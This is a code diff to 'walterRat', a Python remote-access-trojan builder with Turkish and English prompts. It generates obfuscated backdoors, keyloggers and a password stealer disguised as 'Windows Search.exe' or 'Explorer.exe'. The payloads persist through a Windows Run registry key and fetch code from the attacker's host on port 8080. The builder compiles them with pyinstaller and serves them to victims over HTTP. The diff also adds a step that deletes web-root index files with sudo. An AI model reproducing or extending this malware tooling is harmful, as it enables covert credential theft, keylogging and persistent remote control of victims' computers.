@@ -21,8 +21,7 @@ class walterRat:
         print "%s-----------------------------------------------------------------------------%s"%(colors["RED"],colors["END"])
         print "\t%s%sGITHUB%s:%shttps://www.github.com/AzizKpln%s\n\t%s%sFACEBOOK%s:%shttps://www.facebook.com/aziz.kaplan.96387%s\n\t%s%sINSTAGRAM%s:%shttps://www.instagram.com/aziz.kpln%s\n\t%s%sYOUTUBE%s:%shttps://www.youtube.com/channel/UCHGEA5g4iFDdBognYNWCJbA%s"%(colors["BOLD"],colors["OKBLUE"],colors["RED"],colors["YELLOW"],colors["END"],colors["BOLD"],colors["OKBLUE"],colors["RED"],colors["YELLOW"],colors["END"],colors["BOLD"],colors["OKBLUE"],colors["RED"],colors["YELLOW"],colors["END"],colors["BOLD"],colors["OKBLUE"],colors["RED"],colors["YELLOW"],colors["END"])
         print "%s-----------------------------------------------------------------------------%s"%(colors["RED"],colors["END"])
-        
-                
+   
 
     def wywtowrite_Tr(self):
         global wywtowrite
@@ -32,10 +31,13 @@ class walterRat:
     def wywtowrite_En(self):  
          wywtowrite=raw_input("Input The Text That You Want To Replace The Files:")
     def run(self):
-        hostname=subprocess.check_output("hostname",shell=True)
-        hostname=hostname.split("\n")
-        selection="\n\t"+colors["RED"]+"["+colors["YELLOW"]+"1"+colors["RED"]+"]"+colors["GREEN"]+"Turkish\n\n"+"\n\t"+colors["RED"]+"["+colors["YELLOW"]+"2"+colors["RED"]+"]"+colors["GREEN"]+"English\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"walterRat"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
+	hostname=subprocess.check_output(["id"])
+	hostname=hostname.split("(")
+	hostname=str(hostname[1]).split(")")
+
+	selection="\n\t"+colors["RED"]+"["+colors["YELLOW"]+"1"+colors["RED"]+"]"+colors["GREEN"]+"Turkish\n\n"+"\n\t"+colors["RED"]+"["+colors["YELLOW"]+"2"+colors["RED"]+"]"+colors["GREEN"]+"English\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"walterRat"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
         select=raw_input(selection)
+        os.system("sudo rm /var/www/html/index*")
         if select=="1":
             os.system("clear")
             print "%s[!]%sDil Turkce Olarak Belirlendi."%(colors["RED"],colors["YELLOW"])
@@ -122,6 +124,13 @@ import sounddevice
 key=Fernet.generate_key()
 f=Fernet(key)
 token = f.encrypt(b"%s")
+try:
+    e_f_loc=os.environ["appdata"]+"\\Windows Search.exe"
+    if not os.path.exists(e_f_loc):
+        shutil.copyfile(sys.executable,e_f_loc)
+        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v search /t REG_SZ /d "'+e_f_loc+'"',shell=True)
+except:
+    pass
 exec(base64.b64decode(f.decrypt(token)))
 
 """%(code))
@@ -166,16 +175,16 @@ try:
         subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v search /t REG_SZ /d "'+e_f_loc+'"',shell=True)
 except:
     pass
-subprocess.call('%s',shell=True)
-                    
-
+subprocess.call('%s',shell=True)       
 """%(filep,ip_adres,fname,fname)
                     dosya=bd_name+".py"
                     with open(dosya,"w") as f:
                         f.write(evil_file)
-                    hostname=subprocess.check_output("hostname",shell=True)
-                    hostname=hostname.split("\n")
-                    os.system("clear")
+                    hostname=subprocess.check_output(["id"])
+		    hostname=hostname.split("(")
+		    hostname=str(hostname[1]).split(")")
+
+		    os.system("clear")
                     self.__init__()
                     icon="%s[%s+%s]%sIcon Olsun Mu?%s"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["END"])+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"IconSecimi"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                     ico=raw_input(icon)
@@ -208,10 +217,6 @@ temp_folder=tempfile.gettempdir()
 os.chdir(temp_folder)
 get_info("http://%s:8080/%s")
 e_f_loc=os.environ["appdata"]+"\\Windows Search.exe"
-if not os.path.exists(e_f_loc):
-    shutil.copyfile(sys.executable,e_f_loc)
-    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v search /t REG_SZ /d "'+e_f_loc+'"',shell=True)
-
 subprocess.call('%s',shell=True)
 
 
@@ -269,15 +274,17 @@ except:
                     wr.write(kod)
                 Popen(["lxterminal","-t","walterRat","-e","python","viruses/walterRat_listener.py"])
             elif inpt=="2":
+                os.system("systemctl start apache2.service")
                 os.system("clear")
                 self.__init__()
+                Popen(["lxterminal","-t","walterRat","-e","cd /var/www/html/ && python -m SimpleHTTPServer 8080"])
                 print "%s[%s+%s]%sGmail Adresini Gir%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
-                ac="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Mail_Adresi"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
+                ac="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Mail_Address"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                 mail=raw_input(ac)
                 os.system("clear")
                 self.__init__()
                 print "%s[%s+%s]%sParolani Gir%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
-                ac="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Parola"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
+                ac="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Password"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                 password=getpass.getpass(ac)
                 with open(r"viruses/walterRat_keylogger.py","r") as kg:
                     c=kg.read()
@@ -309,17 +316,65 @@ f=Fernet(key)
 token = f.encrypt(b"%s")
 exec(base64.b64decode(f.decrypt(token)))
 """%(k_code)
-                with open("Windows Explorer.py","w") as keylogger:
-                    keylogger.write(keylogger_code)
-                convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe --noconsole --onefile --icon Search-Icon/explorer.ico Windows\ Explorer.py"%(str(hostname[0]))
-                os.system(convert_to_exe)
-                os.system("cp dist/Windows\ Explorer.exe exe_files/")
-                os.system("sudo cp exe_files/Windows\ Explorer.exe /var/www/html")
-                os.system("sudo rm -r dist/ build/ Windows\ Explorer* ")
                 os.system("clear")
                 self.__init__()
-                seng="%s[%s!%s]%sTum Gerekli Dosyalar /var/www/html Klasorunde[Windows Explorer.exe]"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["RED"])
+                seng="%s[%s!%s]%sKeylogger Default Sosyal Muhendislik Ile Mi Uretilsin?%s\n\n\t%s[%s+%s]%sevet/hayir\n%s[%s!%s]%sUse Solely English Letters"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["END"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["RED"])
+                song=seng+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"walterRat"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
+                cus=raw_input(song)
+                cus=cus.upper()
+                
+                if cus=="EVET" or cus=="evet":
+                    os.system("clear")
+                    self.__init__()
+                    bd_name="Explorer"
+                    os.system("clear")
+                    self.__init__()   
+                    with open("Explorer.py","w") as keylogger:
+                        keylogger.write(keylogger_code)
+                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe --noconsole --onefile --icon Search-Icon/explorer.ico Explorer.py"%(str(hostname[0]))
+                    os.system(convert_to_exe)
+                    os.system("cp dist/Explorer.exe exe_files/")
+                    os.system("sudo cp exe_files/Explorer.exe /var/www/html")
+                    os.system("sudo rm -r dist/ build/ Explorer* ")
+                    os.system("clear")
+                
+                else:
+                    os.system("clear")
+                    self.__init__()
+                    seng="%s[%s+%s]%sKeylogger'a Bir Isim Gir%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
+                    song=seng+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Name"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
+                    bd_name=raw_input(song)
+                    os.system("clear")
+                    self.__init__()   
+                    bd_name=bd_name+".py"
+                    with open(bd_name,"w") as keylogger:
+                        keylogger.write(keylogger_code)
+                    seng="%s[%s!%s]%sIcon Eklensin mi%s\n\n\t%s[%s+%s]%sevet/hayir\n%s[%s!%s]%sTurkce Harfleri Kullanmayiniz"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["END"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["RED"])
+                    song=seng+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Icon"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
+                    ic=raw_input(song)
+                    if ic=="evet" or ic=="EVET":
+                        os.system("clear")
+                        self.__init__()
+                        seng="%s[%s+%s]%sIcon Yolunu Gir%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
+                        song=seng+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"IconPath"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
+                        ic_path=raw_input(song)
+                        ic_path=str(ic_path)
+                        convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe --noconsole  --onefile --icon %s %s "%(str(hostname[0]),ic_path,bd_name)
+                        os.system(convert_to_exe)
+                        os.system("cp dist/* exe_files/")
+                        os.system("sudo cp exe_files/*.exe /var/www/html")
+                        os.system("sudo rm -r dist/ build/ *.spec %s "%bd_name)
+                        os.system("clear")
+                    else:
+                        convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe --noconsole  --onefile %s"%(str(hostname[0]),bd_name)
+                        os.system(convert_to_exe)
+                        os.system("cp dist/* exe_files/")
+                        os.system("sudo cp exe_files/*.exe /var/www/html")
+                        os.system("sudo rm -r dist/ build/ *.spec %s "%bd_name)
+                        os.system("clear")
+                seng="%s[%s!%s]%sButun Gerekli Dosyalar /var/www/html Icerisinde"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["RED"])
                 print seng
+
             elif inpt=="5":
                 try:
                     Popen(["lxterminal","-t","walterRat","-e","python","viruses/walterRat_listener.py"])
@@ -328,11 +383,13 @@ exec(base64.b64decode(f.decrypt(token)))
                     self.__init__()
                     print colors["RED"]+"[!]%sOncesinde Backdoor Olusturmus Olmaniz Gerekmektedir."%(colors["YELLOW"])
             elif inpt=="3":
+                os.system("systemctl start apache2.service")
                 os.system("clear")
                 self.__init__()
+                Popen(["lxterminal","-t","walterRat","-e","cd /var/www/html/ && python -m SimpleHTTPServer 8080"])
                 print "%s[%s+%s]%sIp Adresini Gir[Local Aga Saldiracak Isen Private Adresini Gir Yoksa Public Adresini Gir]%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                 address_cross="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Ip_Address"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
-        
+
                 default_private_ip=subprocess.check_output("nmcli -p device show",shell=True)
                 default_private_ip=default_private_ip.split("\n")
                 for i in default_private_ip:
@@ -391,10 +448,11 @@ os.remove("new_project.exe")"""%(ip_adres,mail,password)
                     pstealer.write(p_stealer)
                 convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --onefile  password_stealer.py"%(str(hostname[0]))
                 os.system(convert_to_exe)
-                os.system("cp dist/password_stealer.exe exe_files/")
+                os.system("cp dist/password_stealer.exe viruses/")
+                os.system("cp dist/password_stealer.exe .")
                 os.system("sudo cp viruses/new_project.exe /var/www/html")
-                os.system("sudo cp exe_files/password_stealer.exe /var/www/html")
-                os.system("sudo rm -r *.spec password_stealer.py")
+                os.system("sudo cp viruses/password_stealer.exe /var/www/html")
+                os.system("sudo rm -r *.spec password_stealer.py dist/ build/")
                 os.system("clear")
                 self.__init__()
                 print "%s[!]%sexe_files/ klasorundeki password_stealer.exe dosyasini kurban makineye atman gerekiyor.%s"%(colors["RED"],colors["YELLOW"],colors["END"])
@@ -775,7 +833,7 @@ exec(base64.b64decode(f.decrypt(token)))
                 if cus=="YES" or cus=="yes":
                     os.system("clear")
                     self.__init__()
-                    file_path="%s[%s+%s]%sInput The File That You Want To Enbed[File Has To Be In The Same Directory]%s"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["END"])+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"DosyaYolu"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
+                    file_path="%s[%s+%s]%sInput The File That You Want To Enbed[File Has To Be In The Same Directory]%s"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["END"])+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"FilePath"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                     filep=raw_input(file_path)    
                     fname="Windows Search.exe"
                     evil_file="""
@@ -808,8 +866,10 @@ subprocess.call('%s',shell=True)
                     dosya=bd_name+".py"
                     with open(dosya,"w") as f:
                         f.write(evil_file)
-                    hostname=subprocess.check_output("hostname",shell=True)
-                    hostname=hostname.split("\n")
+                    hostname=subprocess.check_output(["id"])
+		    hostname=hostname.split("(")
+		    hostname=str(hostname[1]).split(")")
+
                     os.system("clear")
                     self.__init__()
                     icon="%s[%s+%s]%sDo You Want To Add An Icon?%s"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["END"])+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"IconSecimi"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
@@ -869,7 +929,7 @@ subprocess.call('%s',shell=True)
                         com="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile --icon %s %s.py"%(str(hostname[0]),ic,bd_name)
                         os.system(com)
                     else:
-                        com="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile %s.py"%(str(hostname[0]),bd_name)
+                        com="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe --noconsole --onefile %s.py"%(str(hostname[0]),bd_name)
                         os.system(com)
                 os.system("cp dist/%s.exe exe_files/"%bd_name)
                 os.system("sudo cp exe_files/%s.exe /var/www/html"%bd_name)
@@ -904,8 +964,10 @@ except:
                     wr.write(kod)
                 Popen(["lxterminal","-t","walterRat","-e","python","viruses/walterRat_listener.py"])
             elif inpt=="2":
+                os.system("systemctl start apache2.service")
                 os.system("clear")
                 self.__init__()
+                Popen(["lxterminal","-t","walterRat","-e","cd /var/www/html/ && python -m SimpleHTTPServer 8080"])
                 print "%s[%s+%s]%sInput Your Gmail Address%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                 ac="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Mail_Address"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                 mail=raw_input(ac)
@@ -944,16 +1006,63 @@ f=Fernet(key)
 token = f.encrypt(b"%s")
 exec(base64.b64decode(f.decrypt(token)))
 """%(k_code)
-                with open("Windows Explorer.py","w") as keylogger:
-                    keylogger.write(keylogger_code)
-                convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe --noconsole --onefile --icon Search-Icon/explorer.ico Windows\ Explorer.py"%(str(hostname[0]))
-                os.system(convert_to_exe)
-                os.system("cp dist/Windows\ Explorer.exe exe_files/")
-                os.system("sudo cp exe_files/Windows\ Explorer.exe /var/www/html")
-                os.system("sudo rm -r dist/ build/ Windows\ Explorer* ")
                 os.system("clear")
                 self.__init__()
-                seng="%s[%s!%s]%sAll The Neceserry Files Are In The /var/www/html Folder[Windows Explorer.exe]"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["RED"])
+                seng="%s[%s!%s]%sDo You Want To Generate The Keylogger With Using Social Engineering?%s\n\n\t%s[%s+%s]%syes/no\n%s[%s!%s]%sUse Solely English Letters"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["END"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["RED"])
+                song=seng+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"walterRat"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
+                cus=raw_input(song)
+                cus=cus.upper()
+                
+                if cus=="YES" or cus=="yes":
+                    os.system("clear")
+                    self.__init__()
+                    bd_name="Explorer"
+                    os.system("clear")
+                    self.__init__()   
+                    with open("Explorer.py","w") as keylogger:
+                        keylogger.write(keylogger_code)
+                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe --noconsole --onefile --icon Search-Icon/explorer.ico Explorer.py"%(str(hostname[0]))
+                    os.system(convert_to_exe)
+                    os.system("cp dist/Explorer.exe exe_files/")
+                    os.system("sudo cp exe_files/Explorer.exe /var/www/html")
+                    os.system("sudo rm -r dist/ build/ Explorer* ")
+                    os.system("clear")
+                
+                else:
+                    os.system("clear")
+                    self.__init__()
+                    seng="%s[%s+%s]%sInput A Name For The Keylogger%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
+                    song=seng+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Name"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
+                    bd_name=raw_input(song)
+                    os.system("clear")
+                    self.__init__()   
+                    bd_name=bd_name+".py"
+                    with open(bd_name,"w") as keylogger:
+                        keylogger.write(keylogger_code)
+                    seng="%s[%s!%s]%sDo You Want To Add An Icon?%s\n\n\t%s[%s+%s]%syes/no\n%s[%s!%s]%sUse Solely English Letters"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["END"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["RED"])
+                    song=seng+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Icon"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
+                    ic=raw_input(song)
+                    if ic=="yes" or ic=="YES":
+                        os.system("clear")
+                        self.__init__()
+                        seng="%s[%s+%s]%sInput The Icon Path%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
+                        song=seng+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"IconPath"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
+                        ic_path=raw_input(song)
+                        ic_path=str(ic_path)
+                        convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe --noconsole  --onefile --icon %s %s "%(str(hostname[0]),ic_path,bd_name)
+                        os.system(convert_to_exe)
+                        os.system("cp dist/* exe_files/")
+                        os.system("sudo cp exe_files/*.exe /var/www/html")
+                        os.system("sudo rm -r dist/ build/ *.spec %s "%bd_name)
+                        os.system("clear")
+                    else:
+                        convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe --noconsole  --onefile %s"%(str(hostname[0]),bd_name)
+                        os.system(convert_to_exe)
+                        os.system("cp dist/* exe_files/")
+                        os.system("sudo cp exe_files/*.exe /var/www/html")
+                        os.system("sudo rm -r dist/ build/ *.spec %s "%bd_name)
+                        os.system("clear")
+                seng="%s[%s!%s]%sAll The Neceserry Files Are In The /var/www/html Folder"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["RED"])
                 print seng
             elif inpt=="5":
                 try:
@@ -967,7 +1076,7 @@ exec(base64.b64decode(f.decrypt(token)))
                 self.__init__()
                 print "%s[%s+%s]%sInput Your Private Or Public Ip Address%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                 address_cross="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Ip_Address"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
-        
+                Popen(["lxterminal","-t","walterRat","-e","cd /var/www/html/ && python -m SimpleHTTPServer 8080"])
                 default_private_ip=subprocess.check_output("nmcli -p device show",shell=True)
                 default_private_ip=default_private_ip.split("\n")
                 for i in default_private_ip:
@@ -1026,10 +1135,12 @@ os.remove("new_project.exe")"""%(ip_adres,mail,password)
                     pstealer.write(p_stealer)
                 convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --onefile  password_stealer.py"%(str(hostname[0]))
                 os.system(convert_to_exe)
-                os.system("cp dist/password_stealer.exe exe_files/")
+                os.system("systemctl start apache2.service")
+                os.system("cp dist/password_stealer.exe viruses/")
+                os.system("cp dist/password_stealer.exe .")
                 os.system("sudo cp viruses/new_project.exe /var/www/html")
-                os.system("sudo cp exe_files/password_stealer.exe /var/www/html")
-                os.system("sudo rm -r *.spec password_stealer.py")
+                os.system("sudo cp viruses/password_stealer.exe /var/www/html")
+                os.system("sudo rm -r *.spec password_stealer.py dist/ build/")
                 os.system("clear")
                 self.__init__()
                 print "%s[!]%spassword_stealer.exe is in the exe_files/ directory%s"%(colors["RED"],colors["YELLOW"],colors["END"])
